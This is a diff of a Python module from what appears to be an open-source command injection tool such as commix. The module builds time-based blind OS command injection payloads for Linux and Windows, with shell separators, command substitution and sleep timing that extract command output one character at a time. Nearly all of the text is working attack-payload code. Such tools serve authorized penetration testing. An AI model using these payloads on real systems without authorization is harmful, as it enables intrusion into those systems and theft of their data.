-                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
+                "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
                 "sleep " + str(timesec)
                 )
-      #if menu.options.data:
+      
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + " != $(" + cmd + pipe + "tr -d '\\n'" + 
-                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + 
-                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator + 
+                "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + cmd + pipe + "tr -d '\\n'" +
+                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" +
+                pipe + "head -1" + pipe + "awk '{print$2}'" + settings.CMD_SUB_SUFFIX + " ]" + separator +
                 "sleep " + str(timesec)
-                )  
+                )
     else:
       pass
 
@@ -413,66 +365,56 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
 __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "])\""
-    if separator == "||" :
-      payload = (separator +  " " 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" +str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " + 
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
                 python_payload +
-                "') do if %i==" +str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
-  else: 
-    if separator == ";" :
-      payload = (separator + 
-                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator +
-                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
+  else:
+    settings.USER_APPLIED_CMD = cmd
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator +
-                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
-                 )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator + 
-                 "str=$(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\")" + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
-                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+      payload = (ampersand +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      #if menu.options.data:
+      
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " != $(python -c \"print ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "])\nexit(0)\") ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      
+
     else:
       pass
 
@@ -482,71 +424,64 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
-
+    else:
+      if settings.TARGET_OS != settings.OS.WINDOWS:
+        payload = payload.replace("\n","%0d")
   return payload
 
 """
 Get the execution output, of shell execution.
 """
 def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                cmd +
+                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c \"" +
-                cmd + 
-                "\"') do if %i==" +str(ascii_char)+
-                " (cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(timesec) + "\")"
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"" +
+                cmd +
+                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                 )
 
   else:
-    if separator == ";" :
-      payload = (separator + 
-                 "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
+                 "if [ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 "str=\"$(" + cmd + ")\"" + separator + 
-                 "if [ " + str(ascii_char) + " != $str ]" + separator + 
-                 "then sleep 0" + separator + 
-                 "else sleep " + str(timesec) + separator + 
-                 "fi "
-                 )
-
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "sleep 0 " + separator + 
-                 "str=\"$(" + cmd + ")\" " + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
+      payload = (ampersand +
+                 "sleep 0 " + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
+                 "[ " + str(ascii_char) + " -eq $" + settings.RANDOM_VAR_GENERATOR + " ] " + separator +
                  "sleep " + str(timesec)
                  )
+
       
-      #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " != \"$(" + cmd + ")\" ] " + separator + 
+                 "[ " + str(ascii_char) + " -ne \"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\" ]" + separator +
                  "sleep " + str(timesec)
-                 )  
+                 )
     else:
       pass
 
@@ -556,65 +491,54 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
 __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
-    if separator == "||" :
-      payload = (separator +  " " + 
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
-                cmd + 
-                "') do if %i==" +str(ascii_char) + " " +
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    if separator == "|" or separator == "||" :
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
+                cmd +
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
 
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
       ampersand = _urllib.parse.quote("&")
-      payload = (ampersand +  " "
-                "for /f \"\"t\"\"o\"\"k\"\"e\"\"n\"\"s\"=*\" %i in ('cmd /c " +
-                cmd + 
-                "') do if %i==" +str(ascii_char) + " " +
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(timesec) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(0)\"" + ")"
+      payload = (ampersand + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c " +
+                cmd +
+                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
+                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + settings.CMD_SUB_SUFFIX + "\""
                 )
-  else: 
-    if separator == ";" :
-      payload = (separator + 
-                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator +
-                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
+  else:
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "fi"
                  )
 
-    elif separator == "%0a" :
-      separator = "\n"
-      payload = (separator + 
-                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator +
-                 "if [ " + str(ascii_char) + " != ${str} ]" + separator +
-                 "then $(python -c \"import time\ntime.sleep(0)\")" + separator + 
-                 "else $(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
-                 "fi "
+    elif separator == _urllib.parse.quote("&&") :
+      #separator = _urllib.parse.quote(separator)
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "[ " + str(ascii_char) + " -eq ${" + settings.RANDOM_VAR_GENERATOR + "} ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
       
-    elif separator == "&&" :
-      separator = _urllib.parse.quote(separator)
-      ampersand = _urllib.parse.quote("&")
-      payload = (ampersand + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " +  separator + 
-                 "str=$(python -c \"print $(echo $(" + cmd + "))\n\")" + separator + 
-                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
-                 "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
-                 )
-      #if menu.options.data:
       separator = _urllib.parse.unquote(separator)
 
     elif separator == "||" :
       pipe = "|"
       payload = (pipe +
-                 "[ " + str(ascii_char) + " != $(python -c \"print $(echo $(" + cmd + "))\n\") ] " + separator + 
-                 "$(python -c \"import time\ntime.sleep(0)\") " + pipe + "$(python -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
+                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\") ] " + separator +
+                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX  
                  )
-      
+
     else:
       pass
 
@@ -624,6 +548,8 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
        settings.HOST_INJECTION == True or \
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
-
+    else:
+      if settings.TARGET_OS != settings.OS.WINDOWS:
+        payload = payload.replace("\n","%0d")
   return payload
 # eof
